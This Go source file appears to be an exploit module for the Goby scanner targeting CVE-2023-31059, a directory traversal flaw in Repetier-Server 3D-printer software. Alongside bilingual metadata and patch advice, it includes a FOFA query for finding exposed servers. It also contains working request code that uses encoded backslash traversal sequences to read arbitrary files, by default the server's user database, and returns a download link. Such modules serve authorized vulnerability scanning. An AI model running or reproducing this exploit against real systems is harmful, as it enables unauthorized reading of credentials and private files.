package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Repeater Server directory traversal vulnerability (CVE-2023-31059)",
    "Description": "<p>Repetier-Server is a server software for 3D printers whose goal is to provide a connection between 3D printers and host software. It allows simultaneous connections to your printer from different sources over the Internet/LAN.</p><p>Repetier-Server version 1.4.10 and previous versions have security vulnerabilities. Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely unsafe state.</p>",
    "Product": "Repetier-Server-Pro-0.90.0",
    "Homepage": "https://www.repetier-server.com",
    "DisclosureDate": "2024-03-13",
    "PostTime": "2024-03-13",
    "Author": "2737977997@qq.com",
    "FofaQuery": "body=\"Repetier-Server Pro\"",
    "GobyQuery": "body=\"Repetier-Server Pro\"",
    "Level": "1",
    "Impact": "<p>Repetier-Server version 1.4.10 and previous versions have security vulnerabilities. Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely unsafe state.</p>",
    "Recommendation": "<p>1. The manufacturer has released a solution, please update to the latest version: <a href=\"https://www.repetier-server.com/download-repetier-server/\">https://www.repetier-server.com/download-repetier-server/</a></p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p><p>3. Set access policies through security devices such as firewalls and set whitelist access.</p>",
    "References": [
        "https://cybir.com/2023/cve/poc-repetier-server-140/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "ProgramData\\Repetier-Server\\database\\user.sql",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "VulType": [
        "Directory Traversal"
    ],
    "CVEIDs": [
        "CVE-2023-31059"
    ],
    "CNNVD": [
        "CNNVD-202304-1865"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Repetier Server 目录遍历漏洞（CVE-2023-31059）",
            "Product": "Repetier-Server",
            "Description": "<p>Repetier-Server 是一个用于3D打印机的服务器软件，其目标是提供3D打印机和主机软件之间的连接。它允许通过互联网/局域网从不同的来源同时连接到您的打印机。</p><p>Repetier-Server 1.4.10 版本及之前版本存在安全漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。</p>",
            "Recommendation": "<p>1、厂商已发布解决方案，请更新到最新版本：<a href=\"https://www.repetier-server.com/download-repetier-server/\">https://www.repetier-server.com/download-repetier-server/</a></p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>Repetier-Server 1.4.10 版本及之前版本存在安全漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br><br></p>",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "Repeater Server directory traversal vulnerability (CVE-2023-31059)",
            "Product": "Repetier-Server-Pro-0.90.0",
            "Description": "<p>Repetier-Server is a server software for 3D printers whose goal is to provide a connection between 3D printers and host software. It allows simultaneous connections to your printer from different sources over the Internet/LAN.</p><p>Repetier-Server version 1.4.10 and previous versions have security vulnerabilities. Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely unsafe state.</p>",
            "Recommendation": "<p>1. The manufacturer has released a solution, please update to the latest version: <a href=\"https://www.repetier-server.com/download-repetier-server/\">https://www.repetier-server.com/download-repetier-server/</a></p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p><p>3. Set access policies through security devices such as firewalls and set whitelist access.</p>",
            "Impact": "<p>Repetier-Server version 1.4.10 and previous versions have security vulnerabilities. Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely unsafe state.<br></p>",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10934"
}`
	vulnerabilityRequestBD3129HA := func(hostInfo *httpclient.FixUrl, route string) (*httpclient.HttpResponse, error) {
		vulnerabilityRequestConfig := httpclient.NewGetRequestConfig("/views..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c" + url.QueryEscape(route) + "%20/base/connectionLost.php")
		vulnerabilityRequestConfig.VerifyTls = false
		vulnerabilityRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, vulnerabilityRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, err := vulnerabilityRequestBD3129HA(hostinfo, `ProgramData\Repetier-Server\database\user.sql`)
            if err != nil {
                 return false
            }
			return strings.Contains(resp.Utf8Html, "SQLite") && strings.Contains(resp.Utf8Html, "SQLite")
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := goutils.B2S(stepLogs.Params["filePath"])
			if len(filePath) > 1 {
				resp, err := vulnerabilityRequestBD3129HA(expResult.HostInfo, filePath)
				if err != nil {
					expResult.Output = err.Error()
				} else if resp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = "下载地址：" + expResult.HostInfo.FixedHostInfo + "/views..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c" + url.QueryEscape(filePath) + "%20/base/connectionLost.php"
				} else {
					expResult.Output = "漏洞利用失败"
				}
			}
			return expResult
		},
	))
}